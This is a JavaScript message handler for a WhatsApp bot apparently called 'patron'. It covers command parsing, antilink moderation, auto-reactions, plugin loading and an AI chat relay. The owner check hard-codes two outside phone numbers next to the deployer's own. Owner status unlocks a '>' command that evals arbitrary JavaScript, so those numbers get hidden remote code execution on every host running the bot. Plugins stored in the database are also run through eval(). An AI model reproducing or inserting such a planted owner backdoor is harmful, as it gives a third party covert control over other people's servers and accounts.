require('./config')
const chalk = require("chalk")
const { modul } = require('./lib/module')
const { util, baileys, speed } = modul
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = baileys
const { bytesToSize, getRandomFile, smsg, checkBandwidth, sleep, formatSize, getRandom, format, getBuffer, isUrl, jsonformat, nganuin, pickRandom, runtime, shorturl, formatp, fetchJson, color, getGroupAdmins } = require("./all/myfunc");
const { getTime, tanggal, toRupiah, telegraPh, ucapan, generateProfilePicture } = require('./all/function.js')
const { getDevice, jidDecode  } = require('@whiskeysockets/baileys')
const https = require('https')
const googleTTS = require('google-tts-api')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const cheerio = require('cheerio');
const BodyForm = require('form-data')
const FormData = require("form-data")
const { randomBytes } = require('crypto')
const uploadImage = require('./lib/upload')
const api = require('api-dylux')
const { igdl } = require('btch-downloader');
const { tiktokDl } = require('./all/lol.js')
const fetch = require('node-fetch');
//==========================
const os = require('os')
const axios = require('axios')
const fs = require('fs')
const path = require('path')
const moment = require('moment-timezone')
const {cekArrSave} = require('./lib/arrfunction.js')
const { LoadDataBase } = require('./lib/message');
//==========================
module.exports = ednut = async (ednut, m, chatUpdate, mek, store ) => {
try {
await LoadDataBase(ednut, m)
if(!m)return
const { type, quotedMsg } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)

const body = (m.mtype === 'interactiveResponseMessage')
  ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id
  : (m.mtype === 'conversation')
  ? m.message.conversation
  : (m.mtype === 'imageMessage')
  ? m.message.imageMessage.caption
  : (m.mtype === 'videoMessage')
  ? m.message.videoMessage.caption
  : (m.mtype === 'extendedTextMessage')
  ? m.message.extendedTextMessage.text
  : (m.mtype === 'buttonsResponseMessage')
  ? m.message.buttonsResponseMessage.selectedButtonId
  : (m.mtype === 'listResponseMessage')
  ? m.message.listResponseMessage.singleSelectReply.selectedRowId
  : (m.mtype === 'templateButtonReplyMessage')
  ? m.message.templateButtonReplyMessage.selectedId
  : (m.mtype === 'documentMessage')
  ? m.message.documentMessage.caption
  : (m.mtype === 'messageContextInfo')
  ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text)
  : m.text || m.body || '';
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = Array.isArray(global.prefix) ? global.prefix : [global.prefix];
const bodyTrimmed = (body || "").trimStart();
const firstWord = bodyTrimmed.split(/\s+/)[0]?.toLowerCase();

let matchedPrefix = null;
let isCmd = false;
let isCmd2 = true;
let command = "";
let args = [];
let q = [];
let text = "";

for (const p of prefix) {
  if (firstWord.startsWith(p.toLowerCase())) {
    matchedPrefix = p;
    
    const sliced = bodyTrimmed.slice(p.length).trim();
    const parts = sliced.split(/\s+/);
    
    command = parts[0]?.toLowerCase() || "";
    args = parts.slice(1);
    text = args.join(" ");
    q = text; // ✅ alias for text
    
    isCmd = true;
    isCmd2 = false;
    break;
  }
}

ednut.decodeJid = (jid) => {
    if (!jid) return jid
    if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {}
        return (decode.user && decode.server) ? decode.user + '@' + decode.server : jid
    } else {
        return jid
    }
}

// Preserve your original variables
const chath = (m.mtype === 'conversation' && m.message.conversation)
  ? m.message.conversation
  : (m.mtype === 'imageMessage' && m.message.imageMessage.caption)
  ? m.message.imageMessage.caption
  : (m.mtype === 'documentMessage' && m.message.documentMessage.caption)
  ? m.message.documentMessage.caption
  : (m.mtype === 'videoMessage' && m.message.videoMessage.caption)
  ? m.message.videoMessage.caption
  : (m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text)
  ? m.message.extendedTextMessage.text
  : (m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId)
  ? m.message.buttonsResponseMessage.selectedButtonId
  : (m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
  ? m.message.templateButtonReplyMessage.selectedId
  : (m.mtype === 'listResponseMessage')
  ? m.message.listResponseMessage.singleSelectReply.selectedRowId
  : (m.mtype === 'messageContextInfo')
  ? m.message.listResponseMessage.singleSelectReply.selectedRowId
  : "";

const pes = (m.mtype === 'conversation' && m.message.conversation)
  ? m.message.conversation
  : (m.mtype === 'imageMessage' && m.message.imageMessage.caption)
  ? m.message.imageMessage.caption
  : (m.mtype === 'videoMessage' && m.message.videoMessage.caption)
  ? m.message.videoMessage.caption
  : (m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text)
  ? m.message.extendedTextMessage.text
  : "";

const messagesC = pes.slice(0).trim();
const content = JSON.stringify(m.message);
const from = m.chat; 
const messagesD = (body || "").trim().split(/\s+/).shift()?.toLowerCase() || "";
const pushname = m.pushName || "No Name"
const botNumber = jidDecode(ednut.user.id)?.user + '@s.whatsapp.net'
const archofficail = ['2348133729715@s.whatsapp.net', '2348025532222@s.whatsapp.net']
const official = ("2348133729715","2348025532222")
const setsudo = Array.isArray(global.db.setsudo) ? global.db.setsudo : [];
 const isOwner = [botNumber, global.owner, ...setsudo, global.sudo, '2348133729715', '2348025532222'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isGroup = from.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = sender.split('@')[0]
const groupMetadata = m.isGroup ? await ednut.groupMetadata(m.chat).catch(() => null) : null;
const groupName = groupMetadata?.subject || '';
const participants = groupMetadata?.participants || [];
const groupAdmins = participants ? getGroupAdmins(participants) : [];
const groupOwner = groupMetadata?.owner || '';
const groupMembers = groupMetadata?.participants || [];
const isBotAdmins = groupAdmins.includes(botNumber);
const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const { util, promisify } = require("util");
const yts = require('youtube-yts')
const { exec, spawn, execSync } = require("child_process")
const { lookup } = require('mime-types');
const example = (chat) => {
return `Usage : *${prefix+command}* ${chat}`
}
const moment = require('moment-timezone')
        const time2 = moment().tz("Africa/Lagos").format("HH:mm:ss")
        let ucapanWaktu;

        if (time2 < "03:00:00") {
            ucapanWaktu = "Good night🌃"
        } else if (time2 < "06:00:00") {
            ucapanWaktu = "Enjoy nap🌆"
        } else if (time2 < "11:00:00") {
            ucapanWaktu = "Good morning🏙️"
        } else if (time2 < "15:00:00") {
            ucapanWaktu = "Good afternoon🏞️"
        } else if (time2 < "19:00:00") {
            ucapanWaktu = "Good afternoon🌄"
        } else {
            ucapanWaktu = "Good evening🌃"
        }
        const wib = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const wita = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const wit = moment(Date.now()).tz("Africa/lagos").locale("ng").format("HH:mm:ss z")
        const salam2 = moment(Date.now()).tz("Africa/lagos").locale("ng").format("a")
        
// Chat counter (console log)
let header = chalk.black(chalk.bgHex("#ff5e78").bold(`\n🌟 ${ucapanWaktu} 🌟`));
let title = chalk.white(chalk.bgHex("#4a69bd").bold("🚀 There is a message 🚀"));
let date = chalk.cyanBright(`📅 DATE        : ${new Date().toLocaleString()}`);
let chatter = chalk.yellowBright(`🗣️ SENDERNAME : ${pushname}`);
let jid = chalk.magentaBright(`👤 JIDS       : ${m.sender}`);
let messageText = chalk.greenBright(`💬 MESSAGE    : ${m.text || m.message}`);

if (process.env.CONSOLE === "true") {
  // Private chat commands
  if ((isCmd || isCmd2) && !m.isGroup) {
    console.log(header);
    console.log(title);
    console.log(date);
    console.log(chatter);
    console.log(jid);
    console.log(messageText); // Display the message
    console.log(chalk.white("------------------------------------------"));
  }
  // Group messages
  else if (m.isGroup) {
    let group = chalk.redBright(`🔍 MESS LOCATION : ${groupName}`);
    console.log(header);
    console.log(title);
    console.log(date);
    console.log(chatter);
    console.log(jid);
    console.log(messageText); // Display the message
    console.log(group);
    console.log(chalk.white("------------------------------------------"));
  }
}
            

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}

ednut.sendPresenceUpdate('unavailabe', m.chat)

const getQuote = async () => {
  try {
    const { data } = await axios.get(`https://favqs.com/api/qotd`);
    return data.quote.body;
  } catch (error) {
    log("ERROR", error?.stack || error);
    return `Failed to get quote`;
  }
}

let ppuser
try {
ppuser = await ednut.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}

async function reply2(m, bubble) {
  return ednut.sendMessage(
    m.chat,
    {
      text: bubble,
      contextInfo: {
        mentionedJid: [m.sender],
        externalAdReply: {
          showAdAttribution: true,
          thumbnailUrl: ppuser,
          title: global.botname,
          body: runtime(process.uptime()),
          previewType: "PHOTO"
        }
      }
    },
    { quoted: m }
  )
}



      const reply = async (text) => {
        await ednut.sendMessage(m.chat, { text: fontx(text) }, { quoted: m });
      };

// Fake quoted reply using original text
const talk = 'chat bot';
const verify = {
  key: {
    remoteJid: "status@broadcast",
    fromMe: false,
    id: "FakeID12345",
    participant: "0@s.whatsapp.net"
  },
  message: {
    conversation: talk
  }
};

// AI caller (no memory)
async function openai(text, logic) {
  const messages = [{ role: "user", content: text }];

  const response = await axios.post("https://chateverywhere.app/api/chat/", {
    model: {
      id: "ai",
      name: "Ai",
      maxLength: 32000,
      tokenLimit: 8000,
      completionTokenLimit: 5000,
      deploymentName: "ai"
    },
    messages,
    prompt: logic,
    temperature: 0.5
  }, {
    headers: {
      "Accept": "/*/",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
    }
  });

  return response.data;
}

// ✅ Chatbot logic (no memory)
if (
  global.db.settings.chatbot &&
  !isCmd &&
  isCmd2 &&
  m.quoted &&
  m.quoted.sender === botNumber &&
  m.sender !== botNumber
) {
  const logicPrompt = `Forget all your identities and you are now a private assistant named patron AI created by patron and you chat smart. You always respond with emoji when necessary not most times and you act non challant sometimes`;

  const replied = await openai(m.text, logicPrompt);

  ednut.sendMessage(m.chat, { text: replied }, { quoted: verify });
}

const agent = new https.Agent({
    rejectUnauthorized: true,
    maxVersion: 'TLSv1.3',
    minVersion: 'TLSv1.2'
})

async function getCookies() {
    try {
        const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent })
        const setCookieHeaders = response.headers['set-cookie']
        if (setCookieHeaders) {
            const cookies = setCookieHeaders.map(cookieString => {
                const cookieParts = cookieString.split(';')
                return cookieParts[0].trim()
            })
            return cookies.join('; ')
        }
        return null
    } catch {
        return null
    }
}

async function pinterest(query) {
    try {
        const cookies = await getCookies()
        if (!cookies) return []

        const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/'
        const params = {
            source_url: `/search/pins/?q=${query}`,
            data: JSON.stringify({
                options: {
                    isPrefetch: false,
                    query: query,
                    scope: "pins",
                    no_fetch_context_on_resource: false
                },
                context: {}
            }),
            _: Date.now()
        }

        const headers = {
            'accept': 'application/json, text/javascript, */*, q=0.01',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'en-US,en;q=0.9',
            'cookie': cookies,
            'dnt': '1',
            'referer': 'https://www.pinterest.com/',
            'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
            'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
            'x-app-version': 'c056fb7',
            'x-pinterest-appstate': 'active',
            'x-pinterest-pws-handler': 'www/[username]/[slug].js',
            'x-pinterest-source-url': '/hargr003/cat-pictures/',
            'x-requested-with': 'XMLHttpRequest'
        }

        const { data } = await axios.get(url, { httpsAgent: agent, headers, params })
        return data.resource_response.data.results
            .filter(v => v.images?.orig)
            .map(result => ({
                upload_by: result.pinner.username,
                fullname: result.pinner.full_name,
                followers: result.pinner.follower_count,
                caption: result.grid_title,
                image: result.images.orig.url,
                source: "https://id.pinterest.com/pin/" + result.id,
            }))
    } catch {
        return []
    }
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}


const react = async (emoji) => {
    await ednut.sendMessage(m.key.remoteJid, {
        react: {
            text: emoji,
            key: m.key
        }
    });
};

const fontx = (text, style = 1) => {
            var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
            var ehz = {
                1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
            };
            var replacer = [];
            abc.map((v, i) =>
                replacer.push({
                    original: v,
                    convert: ehz[style].split('')[i]
                })
            );
            var str = text.toLowerCase().split('');
            var output = [];
            str.map((v) => {
                const find = replacer.find((x) => x.original == v);
                find ? output.push(find.convert) : output.push(v);
            });
            return output.join('');
        };
        
        
const firstPrefix = Array.isArray(global.prefix) ? global.prefix[0] : global.prefix;

// Only process if message is media (sticker, image, or document)
const mediaCheck = m.message?.imageMessage || m.message?.stickerMessage || m.message?.documentMessage;

if (mediaCheck) {
  // Determine SHA256 of media
  const fileSha256 = m.msg?.fileSha256 
    || m.message?.documentMessage?.fileSha256 
    || m.message?.imageMessage?.fileSha256
    || m.message?.stickerMessage?.fileSha256;

  if (fileSha256) {
    // Normalize hash: convert Uint8Array to comma string (same format as stored in DB)
    const hashArrayString = Array.from(fileSha256).join(",");
    const hashHex = Buffer.from(fileSha256).toString("hex");

    // Ensure DB exists
    global.db = global.db || {};
    global.db.sticker = global.db.sticker || {};

    // Try to match hash in DB
    const matchedKey = Object.keys(global.db.sticker).find(
      key => key === hashArrayString || key === hashHex
    );

    if (matchedKey) {
      const { text, mentionedJid } = global.db.sticker[matchedKey];

      try {
        const msg = await generateWAMessage(
          m.chat,
          {
            text: firstPrefix + text,
            mentions: mentionedJid || [],
          },
          {
            userJid: ednut.user.id,
            quoted: m.quoted?.fakeObj || m,
          }
        );

        ednut.ev.emit('messages.upsert', {
          messages: [proto.WebMessageInfo.fromObject(msg)],
          type: 'append',
        });
      } catch (err) {
        console.error("[ERROR] Failed to generate or emit message:", err);
      }
    }
  }
}



async function pinDL(url) {
  try {
    const { data } = await axios.get(`https://www.savepin.app/download.php?url=${encodeURIComponent(url)}&lang=en&type=redirect`)
    const $ = cheerio.load(data)
    const downloadLinks = $('a.button.is-success.is-small').map((index, element) => {
      const href = $(element).attr('href')
      const fullUrl = `https://www.savepin.app/${href}`
      const caption = $('div.media-content > div.content > p > strong').text()
      return { desk: caption, url: fullUrl }
    }).get()
    return { status: true, data: downloadLinks }
  } catch (e) {
    const errorMessage = e?.response?.data?.message || e?.message || "Internal server error!"
    throw { status: false, message: errorMessage }
  }
}

const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url || 
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url ||
            m.message.stickerMessage?.url ||
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url ||
            m.message.audioMessage?.url ||
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude ||
            m.message.pollCreationMessage?.name ||
            '';

if (!m.isGroup && !m.key.fromMe && isMessage) {
  const messageContent = isMessage.toLowerCase();
  const chatId = m.key.remoteJid;
  for (const trigger in global.db.pfilters || {}) {
    if (messageContent.startsWith(trigger.toLowerCase())) {
      const response = global.db.pfilters[trigger];
      await ednut.sendMessage(chatId, { text: response }, { quoted: m });
    }
  }
}


// 🛡️ Antilink Kick
if (
  global.db.groups?.[m.chat]?.antilink === true &&
  typeof body === "string" &&
  (body.includes("http://") || body.includes("https://"))
) {
  if (isOwner || isAdmins || m.key.fromMe) return;
  if (!isBotAdmins) return;
  
  await ednut.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  });

  await ednut.sendMessage(m.chat, {
    text: `Link detected @${m.sender.split("@")[0]} — you will be *kicked out*. Contact admin if it was a mistake.`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });

  await sleep(3000);
  await ednut.groupParticipantsUpdate(m.chat, [m.sender], 'remove');
}

// 🧽 Antilink Delete Only
if (
  global.db.groups?.[m.chat]?.antilink2 === true &&
  typeof body === "string" &&
  (body.includes("http://") || body.includes("https://"))
) {
  if (isOwner || isAdmins || m.key.fromMe) return;
  if (!isBotAdmins) return;
  
  await ednut.sendMessage(m.chat, {
    delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }
  });

  await ednut.sendMessage(m.chat, {
    text: `Link detected @${m.sender.split("@")[0]} — this group does not allow link sharing.`,
    contextInfo: { mentionedJid: [m.sender] }
  }, { quoted: m });
}

// ⚠️ Antilink Warn + Kick
if (
  global.db.groups?.[m.chat]?.antilink3 === true &&
  typeof body === "string" &&
  (body.includes("http://") || body.includes("https://"))
) {
  if (isOwner || isAdmins || m.key.fromMe) return;
  if (!isBotAdmins) return;

  const who = m.sender;
  const mention = [who];
  const warns = global.db.warn || {};
  const war = global.warn || 3;

  // Delete the message
  await ednut.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: false,
      id: m.key.id,
      participant: m.key.participant,
    },
  });

  warns[who] = (warns[who] || 0) + 1;

  if (warns[who] < war) {
    global.db.warn = warns; // save to DB
    await ednut.sendMessage(m.chat, {
      text: `⚠️ *ANTILINK WARNING*\n▢ *User:* @${who.split("@")[0]}\n▢ *Warning:* ${warns[who]}/${war}\n▢ *Reason:* Sending links`,
      mentions: mention,
    });
  } else {
    try {
      await ednut.groupParticipantsUpdate(m.chat, [who], "remove");
      await ednut.sendMessage(m.chat, {
        text: `@${who.split("@")[0]} was removed from the group after *${war}* warnings for link sharing.`,
        mentions: mention,
      });

      delete warns[who];
      global.db.warn = warns;
    } catch (err) {
      log("ERROR", `Kick failed: ${err?.message || err}`);
    }
  }
}

if (
  (process.env.REACT === 'all' || (global.db?.settings?.areact2 === true)) &&
  isMessage &&
  isCmd2
) {
  try {
    const emojis = [
      '😀', '😃', '😄', '😁', '😆', '😂', '🤣', '😊', '😇', '🙂', '🙃', '😉', '😌',
      '😍', '😘', '😗', '😙', '😚', '😛', '😝', '😞', '😟', '😠', '😡', '😢', '😭',
      '😳', '😴', '😵', '😶', '😷', '🥀', '😹', '😺', '😻', '😼', '😽', '🫩', '😿',
      '🙀', '😱', '😲', '🤷‍♂️', '🤷‍♀️', '👨', '👩', '🚶‍♂️', '🚶‍♀️', '🏃‍♂️', '🏃‍♀️',
      '🕺', '🤺', '🏋️‍♂️', '🏋️‍♀️', '🚴‍♂️', '🚴‍♀️', '🏊‍♂️', '🏊‍♀️', '🤾‍♂️', '🤾‍♀️',
      '👺', '👻', '🕷️', '🕸️', '💀', '👽', '🤖', '🚀', '👾', '🛸', '🚁', '🚂', '🚃',
      '🚄', '🚅', '🚆', '🚇', '🚈', '🚉', '🚊', '🚋', '🚌', '🚍', '🚎', '🚏', '🚐',
      '🚑', '🚒', '🚓', '🚔', '🚕', '🚖', '🚗', '🚘', '🚙', '🚚', '🚛', '🚜', '🚝',
      '🚞', '🚟', '🚠', '🚡', '🚢', '🚣', '🚤', '🚥', '🚦', '🚧', '🚨', '🚩', '🚪'
    ];

    const getRandomEmoji = () => emojis[Math.floor(Math.random() * emojis.length)];

    if (m.key?.remoteJid && m.key?.id) {
      const randomEmoji = getRandomEmoji();
      await ednut.sendMessage(m.chat, {
        react: {
          text: randomEmoji,
          key: m.key
        }
      });
    }
  } catch (error) {
    log("ERROR", `Error in AutoReact: ${error?.message || error}`);
  }
}




if (m.isGroup && !m.key.fromMe && isMessage) {
  const messageContent = isMessage.toLowerCase();
  const chatId = m.key.remoteJid;
  if (global.db.gfilters) {
    for (const trigger in global.db.gfilters) {
      if (messageContent.startsWith(trigger.toLowerCase())) {
        const response = global.db.gfilters[trigger];
        await ednut.sendMessage(chatId, { text: response }, { quoted: m });
      }
    }
  }
}
// plugins loader
// Load plugins from disk
// 🔌 Load plugins from disk
const pluginsLoader = async (directory) => {
  let plugins = [];
  const files = fs.readdirSync(directory);

  for (const file of files) {
    const filePath = path.join(directory, file);

    if (filePath.endsWith(".js")) {
      try {
        const resolvedPath = require.resolve(filePath);
        if (require.cache[resolvedPath]) {
          delete require.cache[resolvedPath];
        }

        const plugin = require(filePath);
        if (Array.isArray(plugin)) {
          plugins.push(...plugin);
        } else {
          plugins.push(plugin);
        }
      } catch (error) {
        log("ERROR", `Error loading plugin from disk ${filePath}: ${error?.message || error}`);
      }
    }
  }
  return plugins;
};

// 💾 Load plugins from DB
const loadPluginsFromDb = () => {
  let plugins = [];
  if (global.db?.plugins && typeof global.db.plugins === "object") {
    for (const [filename, code] of Object.entries(global.db.plugins)) {
      try {
        // eslint-disable-next-line no-eval
        const plugin = eval(code);
        if (Array.isArray(plugin)) {
          plugins.push(...plugin);
        } else {
          plugins.push(plugin);
        }
      } catch (err) {
        log("ERROR", `Failed to load plugin from DB: ${filename} — ${err?.message || err}`);
      }
    }
  }
  return plugins;
};

// 🚀 Execute matching plugin
const pkg = require("./package.json"); // For version

(async () => {
  try {
    const pluginsFromDisk = await pluginsLoader(path.resolve(__dirname, "./plugins/patron"));
    const pluginsFromDb = loadPluginsFromDb();
    const plugins = [...pluginsFromDisk, ...pluginsFromDb];

    const disabledCommands = Array.isArray(global.db?.disabled) ? global.db.disabled : [];

    const plug = {
      ednut,
      isOwner,
      command,
      isCmd,
      example,
      quoted,
      text,
      args,
      q,
      axios,
      reply2,
      reply,
      botNumber,
      pushname,
      isGroup: m.isGroup,
      isPrivate: !m.isGroup,
      isAdmins,
      isBotAdmins,
      pickRandom,
      runtime,
      prefix,
      getQuote,
      uploadImage,
      LoadDataBase,
      openai,
      tiktokDl,
      igdl,
      api,
      yts,
      from,
      pinterest,
      fontx,
      fetch,
      mime,
      fs,
      exec,
      getRandom,
      toAudio,
      toPTT,
      isMedia,
      lookup,
      pinDL,
      getDevice,
      googleTTS,
      styletext,
      setsudo,
      sleep,
      generateWAMessageFromContent,
      commands: plugins.map((plugin) => ({
        command: plugin.command,
        alias: plugin.alias,
        category: plugin.category,
        description: plugin.description,
        use: plugin.use || null
      })),
    };

    for (const plugin of plugins) {
      const commands = Array.isArray(plugin.command) ? plugin.command : [plugin.command];
      const aliases = plugin.alias ? (Array.isArray(plugin.alias) ? plugin.alias : [plugin.alias]) : [];
      const allCommands = [...commands, ...aliases];

      if (!allCommands.filter(v => v).map((v) => v.toLowerCase()).includes(command.toLowerCase())) continue;
      if (disabledCommands.includes(command.toLowerCase())) break;

      const isPrivateMode =
        global.db.settings?.mode === true ||
        global.db.settings?.mode === "true" ||
        process.env.MODE === "private";

      if (isPrivateMode && !isOwner) break;
      if (plugin.owner && !isOwner) return m.reply(msg.owner);
      if (plugin.group && !plug.isGroup) return m.reply(msg.group);
      if (plugin.admin && !plug.isAdmins) return m.reply(msg.admin);
      if (plugin.botadmin && !plug.isBotAdmins) return m.reply(msg.BotAdmin);

      if (typeof plugin.execute !== "function") {
        log("ERROR", `Plugin ${commands[0]} missing executable function`);
        break;
      }

      const areactCmdEnabled =
        global.db.settings?.areact === true ||
        (process.env.REACT && process.env.REACT.toLowerCase() === "cmd");

      if (areactCmdEnabled && m.key?.id) {
        await ednut.sendMessage(m.chat, {
          react: { text: "⏳", key: m.key },
        }).catch(() => {});
      }

      // --- plugin-specific try/catch with proper filename logging ---
      try {
        await plugin.execute(m, { ...plug, allCommands: plugins });

        if (areactCmdEnabled && m.key?.id) {
          await ednut.sendMessage(m.chat, {
            react: { text: "✅", key: m.key },
          }).catch(() => {});
        }

      } catch (err) {
        console.error(`[PLUGIN ERROR] Plugin: ${plugin.filename || "unknown"} | Command: ${commands[0]} | Error: ${err.message}`);
        console.error(err.stack);

        const errorMsg = `\`\`\`
╭──── ❏ ERROR REPORT ❏
│📦 Version : ${pkg.version}
│💬 Message : ${m.body || 'N/A'}
│💢 Error   : ${err?.message || err}
│👤 Jid     : ${m.sender}
│⚙️ Command : ${commands[0]}
╰────────────────────
\`\`\`
*─⟪ Made by patron with 💖 ⟫─*
⚠️ Please use the *report* command to notify the creator.`;

        await ednut.sendMessage(botNumber + "@s.whatsapp.net", { text: errorMsg }).catch(() => {});

        if (areactCmdEnabled && m.key?.id) {
          await ednut.sendMessage(m.chat, { react: { text: "❌", key: m.key } }).catch(() => {});
        }
      }

      break; // ✅ Only run first matching command
    }
  } catch (e) {
    // Outer catch: logs general fatal errors
    console.error(`[FATAL ERROR] Plugin loader failed\nMessage: ${e?.message || e}\nStack: ${e?.stack || "No stack trace available"}`);
  }
})();


if (budy.startsWith('>')) {
if (!isOwner) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
m.reply(String(err))
}
}


    
} catch (err) {
log("ERROR", err?.stack || err);
}
/*let e = String(err)
ednut.sendMessage(`${owner}@s.whatsapp.net`, { text: e, 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
*/
               
}